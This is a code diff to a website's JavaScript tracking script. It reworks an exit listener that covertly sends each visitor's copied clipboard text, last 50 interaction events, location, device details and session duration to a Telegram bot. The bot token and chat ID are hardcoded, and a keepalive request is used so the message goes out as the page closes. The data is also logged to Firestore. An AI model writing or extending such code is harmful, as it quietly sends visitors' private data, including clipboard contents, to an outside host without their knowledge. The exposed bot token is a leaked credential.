@@ -40,20 +40,38 @@
 
     // GLOBAL EXIT LISTENER - Single unified handler
     function sendExitMessage() {
-        if (exitSent) return;
+        if (exitSent || window.isInternalNav) return;
         exitSent = true;
 
         const duration = Math.round((new Date() - sessionStartTime) / 1000);
-        const botToken = '8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE';
-        const chatId = '6886010817';
+
+        // Load credentials from cache or defaults
+        const botToken = (window.cachedTelegramConfig && window.cachedTelegramConfig.botToken) || '8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE';
+        const chatId = (window.cachedTelegramConfig && window.cachedTelegramConfig.chatId) || '6886010817';
         const url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
-        const exitMsg = '🛑 Session Ended\n\n📍 ID: ' + (sessionID || 'unknown') + '\n⏱ Duration: ' + duration + 's\n📄 Page: ' + window.location.pathname;
+
+        // Build detailed log content
+        const eventLog = localHistory.slice(-50).join('\n'); // Last 50 events for context
+        const clipboardEntries = localHistory.filter(e => e.includes('Copy:')).join('\n');
+
+        const exitMsg = `🛑 <b>SESSION REPORT [${sessionID || 'unknown'}]</b>\n` +
+            `--------------------------------\n` +
+            `⏱ <b>DURATION:</b> ${duration} seconds\n` +
+            `📍 <b>EXIT PAGE:</b> ${window.location.pathname}\n` +
+            `🌍 <b>GEO:</b> ${sessionData?.city || 'Unknown'}, ${sessionData?.country || ''}\n` +
+            `💻 <b>DEVICE:</b> ${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})\n\n` +
+            `📋 <b>CLIPBOARD:</b>\n${clipboardEntries || 'None'}\n\n` +
+            `📝 <b>EVENT LOG (Last 50):</b>\n${eventLog || 'No events recorded'}`;
 
         fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             keepalive: true,
-            body: JSON.stringify({ chat_id: chatId, text: exitMsg })
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: exitMsg,
+                parse_mode: 'HTML'
+            })
         }).catch(function () { });
     }
 
@@ -1073,26 +1091,14 @@
     }
 
     async function sendPulse(title, priority = 'medium', extra = '') {
-        // if (!window.db) return; // REMOVED: Do not abort early, we might need to send Telegram Beacon
-
         // Build detailed log content
         const eventLog = localHistory.slice(-50).join('\n'); // Last 50 events for better context
-        // Ensure clipboard is captured if available in local history
         const clipboardEntries = localHistory.filter(e => e.includes('Copy:')).join('\n');
-
         const duration = extra.duration || 0;
 
-        // CRITICAL: Send Telegram FIRST (Beacon queues immediately, survives page close)
-        // This must happen BEFORE any async Firestore operations
-        if (priority === 'high') {
-            const exitMsg = `🛑 <b>Session Ended</b>\n` +
-                `Session ID: ${sessionID}\n` +
-                `Duration: ${duration}s\n` +
-                `Exit Page: ${window.location.pathname}`;
-            sendTelegramNotification(exitMsg); // Beacon fires immediately
-        }
+        // Note: Telegram notification is now handled by sendExitMessage 
+        // at the top level for more detailed reports and better exit timing.
 
-        // THEN attempt Firestore write (may be killed during unload, but Telegram is already safe)
         try {
             // Write directly to MESSAGES collection (Only if DB is alive)
             if (window.db) {
@@ -1104,7 +1110,7 @@
                         `⏱ DURATION: ${duration} seconds\n` +
                         `📍 EXIT PAGE: ${window.location.pathname}\n` +
                         `🌍 GEO: ${sessionData?.city || 'Unknown'}, ${sessionData?.country || ''}\n` +
-                        `💻 DEVICE: ${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os})\n\n` +
+                        `💻 DEVICE: ${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})\n\n` +
                         `📋 CLIPBOARD ACTIVITY:\n${clipboardEntries || 'None'}\n\n` +
                         `📝 EVENT LOG (Last 50):\n${eventLog || 'No events recorded'}`,
                     timestamp: firebase.firestore.FieldValue.serverTimestamp(),
@@ -1114,9 +1120,9 @@
                 });
             }
 
-            console.log("🚀 Exit Report Sent to Inbox & Telegram");
+            console.log("🚀 Firestore Report Sent");
         } catch (e) {
-            console.error("Report Send Failed:", e);
+            console.error("Firestore Report Failed:", e);
         }
     }
 
@@ -1171,24 +1177,18 @@
             if (document.hidden) {
                 logHistory('Tab', 'Hidden');
 
-                // EXIT REPORT: Force Execution (Debug Mode)
-                // if (!window.isInternalNav) {
-                if (true) {
-                    const endTime = new Date();
-                    // Use global sessionStartTime (guaranteed) instead of sessionData object (risky)
-                    const duration = Math.round((endTime - sessionStartTime) / 1000);
-
-                    // Send report for ALL exits (removed duration threshold)
+                // EXIT REPORT: Only if not internal navigation
+                if (!window.isInternalNav) {
+                    const duration = Math.round((new Date() - sessionStartTime) / 1000);
+                    // Firestore Report
                     sendPulse("Session Exit", 'high', { duration: duration });
-                } else {
-                    // Reset flag for the next page load
-                    // window.isInternalNav = false; // logic moved to init to persist across unloads if SPA, but here safer to keep true until unload completes
+                    // Telegram Report (sendExitMessage is also called by beforeunload/pagehide)
+                    // but calling it here handles the 'tab switch' or 'minimize' case if desired.
+                    // However, user specifically asked for 'true exit' (X button).
+                    // So we rely on the top-level listeners for Telegram.
                 }
-
             } else {
                 logHistory('Tab', 'Visible');
-                // If they came back, it wasn't a true exit, but we might have already properly handled logic.
-                // Resetting isInternalNav here ensures fresh state for next interaction
                 window.isInternalNav = false;
             }
         });
